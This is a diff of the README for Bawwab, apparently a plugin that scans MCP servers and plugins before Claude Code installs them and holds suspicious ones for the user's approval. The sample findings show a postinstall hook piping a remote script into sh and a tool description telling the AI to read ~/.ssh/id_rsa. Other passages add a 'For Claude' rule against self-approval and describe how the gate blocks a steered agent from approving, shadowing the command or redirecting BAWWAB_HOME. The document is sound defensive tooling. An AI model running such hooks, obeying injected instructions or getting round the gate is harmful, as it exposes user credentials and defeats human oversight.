@@ -58,14 +58,15 @@ Bawwab (بوّاب, *"gatekeeper"*) stands at the door.
 You ask Claude to add an MCP server. Bawwab steps in before the install runs:
 
 ```text
-⛔ bawwab: SUSPICIOUS — @someone/github-mcp@1.2.0  (standard scan)
-  HIGH  F3a91c  package.json:7     postinstall runs: curl https://x.io/i | sh
-  HIGH  F8c20d  src/tools.ts:41    tool "list_repos" description: "…read ~/.ssh/id_rsa…"
-  MED   F07be2  identity           name 1 edit from @modelcontextprotocol/server-github
-Blocked pending your approval. To allow:  ! bawwab approve a7f3
-Deep scan first:  ! bawwab scan --deep @someone/github-mcp@1.2.0
-Explain a finding:  ! bawwab explain F3a91c
+⛔ bawwab blocked this install (security level high):
+  A7F3  github (MCP server)  SUSPICIOUS  install script fetches remote content; tells the AI to read or send sensitive data (+1 more)
+  keep:     ! bawwab approve A7F3  # github (MCP server)
+  details:  ! bawwab explain A7F3
+  For Claude: ask the user with AskUserQuestion (see the bawwab skill); never run approve or reject yourself, and never install it another way.
 ```
+
+`! bawwab explain A7F3` prints the full report: every finding with its evidence, Claude's recommendation, and
+the deep-scan command. A clean install gets one line, `bawwab: scanned github (MCP server): clean`.
 
 Approving is meant for **you**: the gate refuses `bawwab approve` when Claude runs it in any form the gate
 recognises. It can't see every program Claude might write and run, so this stops a steered agent's ordinary
@@ -338,8 +339,20 @@ The plugin adds:
 - **The `bawwab` MCP server** (see [MCP tools](#mcp-tools)).
 - **The `bawwab` command** (`bin/bawwab`, a small launcher for the plugin's own copy, in the same virtualenv as
   the hooks). Claude Code puts it on the `PATH` of Claude's Bash tool, so you don't need the CLI install below.
-  Your `!` shell may not have it on its `PATH`; when it doesn't, Bawwab's messages print the launcher's full
-  path instead of `bawwab`, so you can copy the command as shown.
+  Your `!` shell may not have it on its `PATH`, so Bawwab's messages print a launcher path instead of `bawwab`
+  (as `~/…`), and you can copy the command as shown. With a plugin installed from a marketplace, that path is a
+  stable launcher in the plugin's data folder (`~/.claude/plugins/data/bawwab-<marketplace>/bin/bawwab`), which
+  Bawwab points at the installed version at every session start, so a command you copied earlier still works
+  after an upgrade.
+- **Optional, a short `bawwab` command:** run `! bawwab setup --link` yourself (with the launcher path the
+  messages show). It writes a 3-line `bawwab` script into `~/.local/bin` (or `~/bin`), whichever is on your
+  `PATH`, that runs the launcher. From then on, messages print `! bawwab approve <id>`, but only while the first
+  `bawwab` on `PATH` is exactly that script; if it changes, or another `bawwab` comes first, they go back to the
+  full path. Claude can't run `setup --link`, and the gate refuses, in the forms it recognises, Claude writing a
+  file called `bawwab` into a `PATH` dir or a `bawwab` alias or function into a file. Undo with
+  `! bawwab setup --unlink`. The trade-off: a full path can't be
+  shadowed; a bare name is checked when the message is printed, not when you type it, and Bawwab can't see your
+  shell's own aliases, functions or `PATH` order. See [the threat model](docs/threat-model.md) (5.7).
 
 If setup can't install Bawwab's dependencies (offline, a proxy, uv missing), install commands are held, and
 once Bawwab is initialised so are other tool calls after a config change; read-only tools (Read, Grep, Glob)
@@ -398,7 +411,7 @@ bawwab level                   # show it
 bawwab level high|medium|low   # set it (lowering is refused when Claude runs it)
 
 # Understand a result
-bawwab explain <finding-id>    # plain-language reason + suggested fix
+bawwab explain <id>            # a block's id: the full report; a finding id (F…): plain-language reason + fix
 bawwab diff <name>             # what changed since you trusted it
 
 # Everything already installed
@@ -409,14 +422,24 @@ bawwab effects                 # what is on hold, with every finding and evidenc
 bawwab watch --install         # background watcher as a user service (systemd / launchd)
 bawwab watch --once            # one pass now, then print the status
 bawwab status                  # what is quarantined or on hold, across every agent
+
+# Working on Bawwab itself
+bawwab allow-env <repo-dir>    # commands run in that repo may set BAWWAB_HOME to a dir inside it (tests)
 ```
 
 Exit codes for `bawwab scan`: `0` clean · `1` suspicious · `2` malicious · `3` error, so it slots into CI.
 
-In Claude Code, type these as `! bawwab …`: the `!` runs them in your shell, as you. If `bawwab` isn't on your
-shell's `PATH` (plugin only), use the command exactly as Bawwab's message prints it, which names the plugin's
-launcher by its full path. Claude can run `scan`, `explain`, `diff`, `init --scan`, `setup --retry`, `level`
-and `level high`, but never `approve`, `reject`, `init --skip` or a lower level, by any name or path.
+In Claude Code, type these as `! bawwab …`: the `!` runs them in your shell, as you. With the plugin only,
+use the command exactly as Bawwab's message prints it, which names the plugin's launcher by its path (`~/…`),
+or `bawwab` after `setup --link`. Claude can run `scan`, `explain`, `diff`, `init --scan`, `setup --retry`,
+`setup --unlink`, `allow-env --list`, `level` and `level high`, but never `approve`, `reject`, `init --skip`,
+`setup --link`, `allow-env` or a lower level, by any name or path.
+
+`allow-env` is for developing Bawwab: Bawwab refuses any command that sets `BAWWAB_HOME`, because a nested
+Claude Code pointed at a copied, edited store would skip your decisions. After `! bawwab allow-env <repo>`,
+a command run in that repo may set `BAWWAB_HOME` to a dir inside it (`BAWWAB_HOME=.tmp/bw uv run pytest`), as
+long as it doesn't run `claude` or change `HOME`. Bawwab's hooks never check calls from a Claude Code started
+with such a home: it gets read-only tools only.
 
 ### MCP tools
 
@@ -444,9 +467,13 @@ Reports come back framed as untrusted data, with bawwab's own instructions kept 
   "mode": "standard",
   "llm": { "backend": "claude-cli", "model": "claude-sonnet-5-5" },
   "thresholds": { "malicious": "critical", "suspicious": "med" },
-  "trusted": ["@modelcontextprotocol/*"]
+  "trusted": ["@modelcontextprotocol/*"],
+  "quiet": false
 }
 ```
+
+`"quiet": true` hides the one-line `bawwab: scanned <item>: clean` status after an install passes. Only
+`~/.bawwab/config.json` sets it; warnings and blocks are never hidden.
 
 ## How it resists prompt injection
 
@@ -513,7 +540,9 @@ the same rules to the most popular MCP servers, skills and plugins, with every f
   settings files of the user and of the project in view; another project's settings that enable it are left alone
   (every Claude Code tool call is blocked while it is held anyway).
 - The `SessionStart` inventory only warns. What it finds in things already installed arrives as a warning
-  with your next prompt; it doesn't block anything.
+  with your next prompt; it doesn't block anything. These warnings are shown to you only, never added to
+  Claude's context, so a conversation about something else isn't pulled off course; each is given once per item
+  (again only when its scan result changes).
 - Static rules can be dodged by determined obfuscation. That's why there's a Claude review, a "never below
   suspicious" floor for credential-plus-network code, and an effect check. Bawwab raises the bar a lot; it doesn't promise perfection.
 - Bawwab runs as the same OS user as Claude's tool shell, so it can't fully keep its approve command from
